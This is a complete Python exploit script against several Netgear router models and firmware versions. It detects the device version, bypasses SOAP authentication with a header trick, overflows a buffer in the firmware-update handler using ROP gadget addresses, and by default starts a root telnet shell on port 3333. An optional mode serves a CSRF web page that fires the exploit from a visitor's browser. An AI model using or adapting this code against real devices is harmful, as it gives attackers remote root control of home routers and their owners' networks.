import sys, time, socket, struct, argparse, os, shutil, base64
import socketserver
import http.server

if sys.version_info[0] != 3:
		print("Please run the exploit in python3")
		sys.exit(1)

###########################################################################
## Version Info ###########################################################
###########################################################################

address_info = {
	"EX6100" : {
		# system($sp+0x30)
		"1.0.2.28" : 0x40BC68,
	},
	"R6200V2" : {
		# system($sp+0x198)
		"1.0.3.12" : 0x29658,
	},
	"R7000" : {
		# system($sp)
		"11.100" : 0x2E52C,
		"11.106" : 0x2E1B0,
		"11.110" : 0x2E1B0,
		"11.116" : 0x2E538,
		"11.123" : 0x2E538,
	},
	"XR300" : {
		# upnpd listens on port 56688, soapd listens on 5000 (both are
		# vulnerable, but have different gadget addresses). These are for soapd,
    # system($sp+0x360)
		"1.0.3.56" : 0x31DD8,
		"1.0.3.38" : 0x32004,
	},
}

# A mapping of human friendly versions to the versions returned by currentsetting.htm
firmware_version_to_human_version = {
	"EX6100" : {
		"V1.0.2.28_1.1.138" : "1.0.2.28",
		"V1.0.2.24_1.1.134" : "1.0.2.24",
	},
	"R6200V2" : {
		"V1.0.3.12_10.1.11" : "1.0.3.12",
	},
	"R7000" : {
		"V1.0.11.100_10.2.100" : "11.100",
		"V1.0.11.106_10.2.100" : "11.106",
		"V1.0.11.110_10.2.100" : "11.110",
		"V1.0.11.116_10.2.100" : "11.116",
		"V1.0.11.123_10.2.100" : "11.123",
	},
	"XR300" : { # These offsets are in soapd, which listens on port 5000, upnpd is on 56688
		"V1.0.3.56_10.3.41"    : "1.0.3.56",
		"V1.0.3.38_10.3.30"    : "1.0.3.38",
	},
}

# The default command, spawns a telnet daemon on TCP port 3333
default_commands = {
	"R6200V2"   : "/bin/utelnetd -p3333 -l/bin/sh -d",
	"R7000"     : "/bin/utelnetd -p3333 -l/bin/sh -d",
	"XR300"     : "/bin/utelnetd -p3333 -l/bin/sh -d",

	# Need to create the terminal device files first
	"EX6100"     : "mknod /dev/ptyp0 c 2 0; mknod /dev/ttyp0 c 3 0; mknod /dev/ptyp1 c 2 1; mknod /dev/ttyp1 c 3 1; telnetd -p3333 -l/bin/sh",
}

# Devices that are big endian
big_endian_devices = []

###########################################################################
## Functions ##############################################################
###########################################################################

def send(ip, port, is_https, payload, keep_open = False):
	if is_https:
		return send_ssl(ip, port, payload, keep_open)
	else:
		return send_plain(ip, port, payload, keep_open)

def send_plain(ip, port, payload, keep_open):
	sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	sock.connect((ip, port))
	sock.send(payload)
	time.sleep(1)
	if keep_open:
		return sock
	sock.close()

def send_ssl(ip, port, payload, keep_open):
	import ssl
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	wrappedSocket = ssl.wrap_socket(sock)
	wrappedSocket.connect((ip, port))
	wrappedSocket.send(payload)
	time.sleep(1)
	if keep_open:
		return wrappedSocket
	wrappedSocket.close()

def s2b(s):
	return bytes([ord(x) for x in s])

def p32(address, model):
	if model in big_endian_devices:
		return struct.pack(">I", address)
	return struct.pack("<I", address)

def find_item(contents, start_string):
	start = contents.find(start_string)
	if(start == -1):
		print("Failed to automatically detect version.")
		sys.exit(1)

	start += len(start_string)
	end = contents.find(b"\r\n", start)
	return contents[start:end].upper() # upper just in case

def detect_model_version(ip, port, is_https):
	request = b"GET /currentsetting.htm HTTP/1.1\r\n\r\n"
	sock = send(ip, port, is_https, request, True)

	contents = b""
	while True:
		data = sock.recv(2048)
		if not data: break
		contents += data

	# Some older models/versions don't have the currentsetting.htm page, or it's protected by login
	if contents.find(b"401 Unauthorized") != -1:
		print("Version detection against this router is not possible using currentsetting.htm.\n")
		print("Received response:\n")
		print(contents)
		sys.exit(1)

	model = find_item(contents, b"Model=").decode("ASCII")
	firmware_version = find_item(contents, b"Firmware=").decode("ASCII")

	if (model not in firmware_version_to_human_version.keys() or
			firmware_version not in firmware_version_to_human_version[model]):
		print("Unknown model and version: {} {}".format(model, firmware_version))
		sys.exit(1)

	return model, firmware_version_to_human_version[model][firmware_version]

class CSRFRequestHandler(http.server.SimpleHTTPRequestHandler):
	def do_GET(self):
		self.send_response(200)
		self.send_header("Content-Type", "text/html")
		self.send_header("Content-Length", len(self.page))
		self.end_headers()
		self.wfile.write(self.page)

###########################################################################
## Main Execution #########################################################
###########################################################################

def login(args):
	payload  = s2b("<Username>{}</Username>".format(args.username))
	payload += s2b("<Password>{}</Password>".format(args.password))

	request  = b'POST /soap/server_sa HTTP/1.1\r\n'
	request += s2b('Host: http{}://{}:{}\r\n'.format("s" if args.https else "", args.ip, args.port))
	request += b'SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin\r\n'
	request += s2b('Content-Length: {}\r\n'.format(len(payload)))
	request += b'\r\n'
	request += payload

	sock = send(args.ip, args.port, False, request, True)

	response = b""
	while True:
		data = sock.recv(4096)
		if not data: break
		response += data
	sock.close()

	start = response.find(b"sess_id=")
	if start == -1:
		return None
	start += 8

	end = response.find(b";", start)
	if end == -1:
		return None
	return response[start:end]

def main(args):
	if args.version == "" or args.model == "":
		if args.csrf:
			print("The model and version cannot be automatically determined in CSRF mode.")
			sys.exit(1)
		args.model, args.version = detect_model_version(args.ip, args.http_port, args.https)
		print("Automatically detected model {} and version {}".format(args.model, args.version))

	if args.version_only:
		sys.exit(1)

	# Check to make sure we support this firmware
	if args.model not in address_info or args.version not in address_info[args.model]:
		print("Unknown model {} or version {}".format(args.model, args.version))
		sys.exit(1)

	# Resolve the default command
	USING_DEFAULT_COMMAND = (args.command == "START_TELNET")
	if USING_DEFAULT_COMMAND:
		# Resolve the default command (which may be specific to a version)
		args.command = default_commands[args.model]
		if type(args.command) != str:
			args.command = args.command[args.version]

	session_id = None
	if args.password != "":
		session_id = login(args)
		if session_id == None:
			print("Failed to login. Check username and password")
			sys.exit(1)
		print("Logged in successfully. Session ID:",session_id.decode("ASCII"))

	rop_gadget = address_info[args.model][args.version]
	if type(rop_gadget) == list:
		rop_gadget = [p32(x, args.model) for x in rop_gadget]
	else:
		rop_gadget = p32(rop_gadget, args.model)

	overflow  = b"*#$^\x00\x00\x08\x00"
	if args.model in ["R6200V2", "R7000", "XR300"]:
		overflow += b"A"*0x90
		overflow += b"B"*4 # r4
		overflow += b"C"*4 # r5
		overflow += b"D"*4 # r6
		overflow += b"E"*4 # r7
		overflow += b"F"*4 # r8
		overflow += b"G"*4 # r9
		overflow += b"H"*4 # r10
		overflow += rop_gadget
		if args.model == "XR300":
			overflow += b"I"*0x360
		elif args.model == "R6200V2":
			overflow += b"I"*0x198
		overflow += s2b(args.command + "\x00") # Add the command and then NULL-terminate it
	elif args.model in ["EX6100"]:
		overflow += b"A"*0x60
		overflow += b"B"*4 # s0
		overflow += b"C"*4 # s1
		overflow += b"D"*4 # s2
		overflow += b"E"*4 # s3
		overflow += rop_gadget
		overflow += b"F"*0x34
		overflow += s2b(args.command + "\x00") # Add the command and then NULL-terminate it

	payload =  b'<?xml version="1.0"?>\r\n'
	payload += b'<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n'
	payload += b'<SOAP-ENV:Body>\r\n'
	payload += b'UpdateNewFirmware\r\n'
	payload += b'<NewFirmware>'
	payload += base64.b64encode(overflow)
	payload += b'</NewFirmware>\r\n'

	# trailer
	payload += b"</SOAP-ENV:Body>\r\n"
	payload += b"</SOAP-ENV:Envelope>"

	if args.file:
		# Write the payload to a file
		fd = open(args.ip, "wb")
		fd.write(payload)
		fd.close()

	elif args.csrf:
		# Start a web server to serve a webpage that will send CSRF payload to exploit the router
		protocol = "http"
		port = ""
		if args.https:
			protocol = "https"
		if (not args.https and args.port != 80) or (args.https and args.port != 443):
			port = ":{}".format(args.port)
		base_url = "{}://{}{}".format(protocol, args.ip, port)

		# Prepend the necessary fields (they don't actually parse the HTTP request, just search for strings)
		data  = b'SOAPAction: urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate'
		data += b'SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig\r\n'
		data += payload

		webpage = "<html><body>\n"
		webpage += "<h1>Example CSRF Webpage</h1><p>Exploiting the {} version {} at {}:{}</p>".format(args.model, args.version, args.ip, args.port)
		webpage += "<script>"
		webpage += 'var data = new ArrayBuffer({});\n'.format(len(data))
		webpage += 'var l8 = new Uint8Array(data);\n'
		for i in range(len(data)):
			webpage += 'l8[{}]={};\n'.format(i,data[i])
		webpage += 'var xhr = new XMLHttpRequest;\n'
		webpage += 'xhr.open("POST", "{}/soap/server_sa", false);\n'.format(base_url)
		webpage += 'xhr.send(data);\n'
		webpage += "</script></body></html>"

		CSRFRequestHandler.page = s2b(webpage)
		socketserver.TCPServer.allow_reuse_address = True
		server = socketserver.TCPServer(("", args.csrf_port), CSRFRequestHandler)
		print("CSRF Web Server started on port {} for {} Version {} exploit against {}:{}".format(args.csrf_port, args.model, args.version, args.ip, args.port))
		server.serve_forever()

	else:
		# Send the payload
		request  = b'POST /soap/server_sa HTTP/1.1\r\n'
		request += s2b('Host: http://{}:{}\r\n'.format(args.ip, args.port))
		if session_id == None and args.model not in ["EX6100"]:
			request += b'SOAPAction: urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate'
		request += b'SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#UpdateNewFirmware\r\n'
		if session_id != None:
			request += b'Cookie: sess_id=' + session_id + b';\r\n'
		request += s2b('Content-Length: {}\r\n'.format(len(payload)))
		request += b'\r\n'
		request += payload

		send(args.ip, args.port, False, request)

if __name__ == "__main__":
	parser = argparse.ArgumentParser(description='Run the exploit')
	parser.add_argument('ip', type=str, default=None, help='The IP address of the device to exploit')
	parser.add_argument('-username', type=str, default="admin", help='The username for the device')
	parser.add_argument('-password', type=str, default="", help='Optionally, the password for the device. Not required. If specified, the bug will be triggered via a normal'
		+ ' login session, rather than the auth bypass')
	parser.add_argument('-command', type=str, default="START_TELNET", help='The command to run; default is to start telnet on port 3333')
	parser.add_argument('-csrf', required=False, action='store_true', help='Run a web server that sends the exploit as a CSRF payload')
	parser.add_argument('-csrf_port', type=int, default=8000, help='The port to listen on when serving the CSRF exploit')
	parser.add_argument('-file', required=False, action='store_true', help='Write the exploit to a file. Use the ip argument to specify the filename.')
	parser.add_argument('-https', required=False, action='store_true', help='Use HTTPS when gathering the version from the webserver')
	parser.add_argument('-http_port', type=int, default=80, help='The port of the webserver to gather the version')
	parser.add_argument('-port', type=int, default=5000, help='The port of the upnp to exploit')
	parser.add_argument('-model', type=str, default="", help='The model of the device to exploit (default autodetect via the webserver).'
		+ ' Supported models are: {}'.format(", ".join(address_info.keys())))
	parser.add_argument('-version', type=str, default="", help='The version of the device to exploit (default autodetect via the webserver).'
		+ ' Supported versions are: {}'.format("; ".join(["{}: {}".format(x, ", ".join(address_info[x])) for x in address_info.keys()])))
	parser.add_argument('-version-only', required=False, action='store_true', help="Only detect the model/version of a device, don't exploit")
	args = parser.parse_args()
	args.model = args.model.upper()

	main(args)

